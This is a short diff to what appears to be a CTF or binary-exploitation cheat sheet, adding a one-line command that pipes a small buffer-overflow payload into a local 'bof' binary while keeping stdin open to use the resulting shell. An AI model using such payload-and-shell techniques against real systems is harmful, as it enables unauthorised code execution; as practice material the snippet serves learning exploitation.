@@ -34,6 +34,7 @@ p.interactive() # look we got a shell
 # alternative to the above, keeps the pipe open after sending the exploit
 # so as to enable you to actually use the shell.
 cat <(python solve.py) - | ./binary
+(python -c "print 'A'*2+'\x42'" ; cat) | ./bof
 ```
 
 ```
